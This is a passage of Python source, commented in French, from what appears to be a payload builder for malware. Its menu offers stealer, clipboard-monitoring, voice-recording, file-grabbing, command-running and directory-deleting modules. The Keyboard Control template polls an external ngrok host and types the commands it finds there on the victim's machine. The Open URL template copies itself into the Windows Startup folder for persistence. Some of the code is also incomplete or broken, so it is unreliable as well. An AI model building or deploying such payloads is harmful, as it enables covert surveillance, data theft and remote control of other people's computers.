    def chemin_option():
        clear()
        fichier = input("Entrez le chemin complet du fichier à récupérer : ").strip()
        if fichier == "":
            print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
            time.sleep(1)
            affichage()
            return
        # On vérifie que le fichier existe bien sur la machine configurante
        if os.path.isfile(fichier):
            choix["Chemin du fichier"] = fichier
            print(Fore.GREEN + f"Fichier trouvé et défini : {fichier}" + Style.RESET_ALL)
        else:
            # On accepte quand même le chemin car le payload tournera sur une autre machine
            print(Fore.YELLOW + "Attention : ce fichier n'existe pas sur cette machine." + Style.RESET_ALL)
            print(Fore.YELLOW + "Il sera cherché sur la machine cible à l'exécution." + Style.RESET_ALL)
            choix["Chemin du fichier"] = fichier
        time.sleep(1)
        affichage_filegrab()

    def delai_option():
        clear()
        delai = input("Délai avant l'envoi (secondes) : ")
        try:
            delai = int(delai)
            if delai < 0:
                print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                time.sleep(1)
                affichage_filegrab()
                return
            choix["Délai avant envoi"] = delai
            print(f"Délai défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage_filegrab()

    def nom_option():
        clear()
        nom = input("Nouveau nom du fichier à l'envoi (laisser vide = nom original) : ").strip()
        choix["Nouveau nom fichier"] = nom if nom != "" else None
        print(f"Nom à l'envoi : {choix['Nouveau nom fichier'] or 'nom original conservé'}.")
        time.sleep(1)
        affichage_filegrab()

    options = [
        ("Chemin du fichier",    chemin_option),
        ("Délai avant envoi",    delai_option),
        ("Nouveau nom fichier",  nom_option),
    ]


    def create_payload():
        global code

        code += f"""
import os
import time
import requests

# ============================================================
# Configuration générée automatiquement
# ============================================================
FICHIER         = {choix["Chemin du fichier"]!r}
DELAI           = {choix["Délai avant envoi"]}
NOM_ENVOI       = {choix["Nouveau nom fichier"]!r}


# ============================================================
# File Grab
# ============================================================

def lancer_filegrab():

    # Délai avant l'envoi
    if DELAI > 0:
        print(f"Attente de {{DELAI}} secondes...")
        time.sleep(DELAI)

    # Vérification que le fichier existe
    if not os.path.isfile(FICHIER):
        print(f"Erreur : fichier introuvable -> {{FICHIER}}")
        return

    # Nom du fichier à l'envoi
    nom_final = NOM_ENVOI if NOM_ENVOI else os.path.basename(FICHIER)

    print(f"Fichier trouvé : {{FICHIER}}")
    print(f"Envoi sous le nom : {{nom_final}}")

"""

def keybcontrol():
    code += """
import requests
from bs4 import BeautifulSoup
import pyautogui
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time

site = "https://nonreversing-dulcie-dashingly.ngrok-free.dev/"

test = requests.get(site, verify=False)


mapping = {
    "ctrl": "ctrl",
    "maj": "shift",
    "shift": "shift",
    "alt": "alt",
    "win": "win",
    "enter": "enter"
}

# touches simples reconnues
touches_simples = ["ctrl", "shift", "alt", "win", "enter", "fn", "delete"]

while True:

##################### Test en ligne #####################
    if test.status_code != 200:
        print(f"Erreur lors de la connexion à {site} : {test.status_code}")



############ NE PAS S'EN OCCUPER #####################
    response = requests.get(site, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    champ = soup.find("textarea", {"id": "texte"})
######################################################

    if not champ:
        continue

    texte = champ.get_text()

    if not texte:
        continue

    lignes = texte.split("\n")

    for ligne in lignes:
        ligne = ligne.strip().lower()

        if not ligne:
            continue

        if " " in ligne and any(k in ligne for k in mapping):
            touches = ligne.split()
            touches = [mapping.get(t, t) for t in touches]
            pyautogui.hotkey(*touches)

        elif ligne in touches_simples:
            pyautogui.press(mapping.get(ligne, ligne))

        else:
            pyautogui.write(ligne)

        time.sleep(0.3)  

    time.sleep(5)
"""
def openurl():
    global code

    choix = {
        "URL": None,
        "Démarrage": False,
        "Fenêtre": False,
        "Onglet": False,
        "Nombre": 1,
        "Délai": 0,
    }

    def affichage_url():
        clear()
        print(Fore.CYAN + "=== Open URL ===\n\n" + Style.RESET_ALL)
        print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. URL à ouvrir
    2. Navigateur à utiliser (par défaut : système)
    3. Ouvrir en fenêtre 
    4. Ouvrir en onglet
    5. Nombre de fois à ouvrir
    6. Délai entre les ouvertures (si option 5 configurée)
          
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}

          """)
    # -------------------------
    # OPTIONS
    # -------------------------
    def set_url():
        val = input("URL : ").strip()
        if val:
            choix["URL"] = val

    def set_startup():
        val = input("Démarrage ? (y/n) : ").lower()
        choix["Démarrage"] = (val == "y")

    def set_window():
        val = input("Fenêtre ? (y/n) : ").lower()
        choix["Fenêtre"] = (val == "y")

    def set_tab():
        val = input("Onglet ? (y/n) : ").lower()
        choix["Onglet"] = (val == "y")

    def set_count():
        try:
            val = int(input("Nombre : "))
            choix["Nombre"] = max(1, val)
        except:
            pass

    def set_delay():
        try:
            val = int(input("Délai : "))
            choix["Délai"] = max(0, val)
        except:
            pass

    options = {
        "1": set_url,
        "2": set_startup,
        "3": set_window,
        "4": set_tab,
        "5": set_count,
        "6": set_delay,
    }

    # -------------------------
    # PAYLOAD
    # -------------------------
    def create_payload():
        global code

        if not choix["URL"]:
            print("URL requise")
            time.sleep(1)
            return

        code += f"""
import webbrowser
import time
import os
import sys

URL = {repr(choix["URL"])}
STARTUP = {choix["Démarrage"]}
WINDOW = {choix["Fenêtre"]}
TAB = {choix["Onglet"]}
COUNT = {choix["Nombre"]}
DELAY = {choix["Délai"]}

def open_url():

    if STARTUP:
        if sys.platform == "win32":
            startup = os.path.join(
                os.getenv("APPDATA"),
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup"
            )
            path = os.path.abspath(sys.argv[0])
            dest = os.path.join(startup, "open_url_payload.py")

            if not os.path.exists(dest):
                try:
                    import shutil
                    shutil.copy2(path, dest)
                except Exception as e:
                    print(f"Erreur startup : {{e}}")

    if WINDOW:
        webbrowser.open_new(URL)
    elif TAB:
        webbrowser.open_new_tab(URL)
    else:
        webbrowser.open(URL)

def run_open_url():
    for _ in range(COUNT):
        if DELAY > 0:
            time.sleep(DELAY)
        open_url()

run_open_url()
"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_url()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()

def affichage_addpayload(modules_choisis):
    global modules_disponibles, affichage_
    clear()
    print(Fore.CYAN + "=== Ajouter un module payload ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Modules disponibles :
{Fore.WHITE}
    1. Clipboard Monitor
    2. Remove Directory
    3. Remove Script
    4. Run Command
    5. Shutdown
    6. Stealer
    7. Voice Record
    8. Change Wallpaper
    9. Search Interceptor (en développement)
    10. Directory Lister
    11. File Grabber
    12. Keyboard Control
    13. Open URL
{Fore.GREEN}
Tapez : <num> pour configurer
Tapez : valider pour valider
{Style.RESET_ALL}""")
    
    choix = input(">>  ").lower()

    for num, module in enumerate(modules_disponibles, start=1):
        if choix == f"{num}":

            modules_choisis.append(module)  # ✅ AJOUT ICI

            if module == "Clipboard Monitor":
                clipboard_module()

            elif module == "Remove Directory":
                rmdir_module()
            elif module == "Remove Script":
                rmscript()
            elif module == "Run Command":
                runcmd_module()
            elif module == "Shutdown":
                shutdown_module()
            elif module == "Stealer":
                steal_module()
            elif module == "Voice Record":
                voicerecorder_module()
            elif module == "Change Wallpaper":
                wallpaper_module()
            #elif module == "Search Interceptor":
            #    search_interceptor()
            elif module == "Directory Lister":
                directory_listing_module()
            elif module == "File Grabber":
                filegrab()
            elif module == "Keyboard Control":
                keybcontrol()
            elif module == "Open URL":
                openurl()
    



def multipayload_module():
    clear()
    print("=== Multi Payload Configuration ===\n\n")

    modules_choisis = []


    while True:
        affichage()
        cmd = input(">>  ").lower()

        if cmd == "exit":
            break
        elif cmd == "show":
            clear()
            print("Modules ajoutés :")
            for mod in modules_choisis:
                print(f"- {mod}")
            input("\nAppuyez sur Entrée pour continuer...")
        elif cmd == "1":
            affichage_addpayload(modules_choisis)

        elif cmd == "create":
            if code == "":
                print(Fore.RED + "Aucun module ajouté !" + Style.RESET_ALL)
                time.sleep(2)
                continue

            os.makedirs("payload", exist_ok=True)

            with open("payload/final_payload.py", "w", encoding="utf-8") as f:
                f.write(code)

            print(Fore.GREEN + "Payload généré dans payload/final_payload.py" + Style.RESET_ALL)
            break
